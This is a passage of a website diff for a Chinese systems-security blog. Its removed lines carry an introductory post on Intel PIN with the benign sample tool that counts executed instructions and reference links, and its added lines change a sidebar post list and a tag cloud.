class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></div><div class="line"></div><div class="line">ofstream OutFile;</div><div class="line"></div><div class="line"><span class="comment">// The running count of instructions is kept here</span></div><div class="line"><span class="comment">// make it static to help the compiler optimize docount</span></div><div class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// This function is called before every instruction is      executed</span></div><div class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</div><div class="line"></div><div class="line"><span class="comment">// Pin calls this function every time a new instruction     is encountered</span></div><div class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Insert a call to docount before every            instruction, no arguments are passed</span></div><div class="line">  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">KNOB&lt;<span class="built_in">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</div><div class="line"><span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>);</div><div class="line"></div><div class="line"><span class="comment">// This function is called when the application exits</span></div><div class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed     by the application</span></div><div class="line">  OutFile.setf(ios::showbase);</div><div class="line">  OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  OutFile.close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Print Help Message                                                        */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic          instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt;      <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Main                                                                      */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t      &lt;toolname&gt; -- ...    */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line">&#123;</div><div class="line">   <span class="comment">// Initialize pin</span></div><div class="line">   <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</div><div class="line"></div><div class="line">   OutFile.open(KnobOutputFile.Value().c_str());</div><div class="line"></div><div class="line">  <span class="comment">// Register Instruction to be called to instrument      instructions</span></div><div class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</div><div class="line"></div><div class="line">   <span class="comment">// Register Fini to be called when the application      exits</span></div><div class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Start the program, never returns</span></div><div class="line">    PIN_StartProgram();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cs.virginia.edu/kim/docs/pldi05.pdf" target="_blank" rel="external">PLDI’2005</a></p>
-<p><a href="https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/" target="_blank" rel="external">PIN User Manual</a></p>
-<p><a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool" target="_blank" rel="external">PIN Intel Tutorials</a></p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/二进制分析/">二进制分析</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Instrumentation/">Instrumentation</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PIN/">PIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -897,6 +1058,18 @@ cd kbeast-v1
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170301/pvops/">Hook内核之PVOPS</a></h6>
+          <!--  <span>三月 1, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1078,18 +1251,6 @@ cd kbeast-v1
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a></h6>
-          <!--  <span>一月 4, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1110,7 +1271,7 @@ cd kbeast-v1
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 12px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Course/" style="font-size: 12px;">Course</a> <a href="/tags/Exploit/" style="font-size: 18px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 11px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 14px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 14px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 14px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11px;">Malware</a> <a href="/tags/Memory/" style="font-size: 14px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 11px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Professor/" style="font-size: 13px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 11px;">Stack</a> <a href="/tags/System/" style="font-size: 19px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 17px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
+      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Course/" style="font-size: 11.82px;">Course</a> <a href="/tags/Exploit/" style="font-size: 18.18px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.64px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 14.55px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 10.91px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 17.27px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
     </div>
   </div>
 
